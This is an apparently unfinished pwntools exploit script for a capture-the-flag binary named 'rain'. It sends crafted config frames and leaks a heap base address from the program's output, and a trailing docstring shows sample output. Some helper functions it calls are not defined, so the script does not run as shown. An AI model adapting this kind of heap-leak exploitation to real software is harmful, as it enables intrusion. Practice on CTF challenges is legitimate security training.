#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from pwn import *
from time import sleep

exe  = context.binary = ELF('./rain')
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 1337)

gdbscript = '''
tbreak main
b *0x401c46
b *0x401aff
b *0x401e12
b *0x401694
b *0x400ef6
set backtrace limit 5
continue
'''.format(**locals())

def gen_struct(h, w, fc, bc, rainfall, dk, table):
	fake = p32(h) + p32(w) + p8(fc) + p8(bc) + p32(rainfall) + dk + table
	return fake

def config(data):
	io.sendlineafter(b"ch> ", b"1")
	io.sendafter(b"FRAME> ", data)

def display():
	io.sendlineafter(b"ch> ", b"2")

libc=ELF("./libc.so.6")
io = start()

table=b""
for i in range(0xff):
	table+=chr(i).encode('latin-1')

pp=b"\x80\x00\x00\x00\x45\x46\x47\x48\x49\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x70"
pp=gen_struct(0x50, 0x50, 0x2, 0x1, 0x64, p32(0x603020) , p32(0x603020) )


config(p32(0x50) + p32(0x50) + p8(0x2) + p8(0x1) + p32(0x64) + p32(1))
config(cyclic(18, n=4))
display()
io.recvuntil(b"Table:            ")
heap_base=(uu64(ren(2))*0x1000)-0x8000
info(f"heap base := {hex(heap_base)}")

io.interactive()

"""
default
Your config:::
Screen height:    0x50
Screen width:     0x50
Front color[0-7]: 0x2
Back color[0-7]:  0x1
Rainfall:         0x64
Speed:            0xc350
Table:            ABCDEFGHIJKLMNOPQRSTUVWXYZ

"""